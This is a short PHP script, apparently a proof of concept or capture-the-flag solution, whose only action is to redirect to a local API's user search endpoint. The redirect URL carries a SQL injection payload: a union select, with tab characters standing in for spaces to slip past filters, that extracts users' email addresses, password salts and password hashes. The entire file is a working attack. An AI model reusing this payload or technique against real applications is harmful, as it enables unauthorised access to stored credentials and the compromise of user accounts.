<?php
header("Location: http://127.0.0.1:3000/api/v1/users/search?q=')%09union%09all%09select%091,2,(select%09email%09from%09user)||':'||(select%09salt%09from%09user)||':'||(select%09passwd%09from%09user),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--%09-");
die();
?>
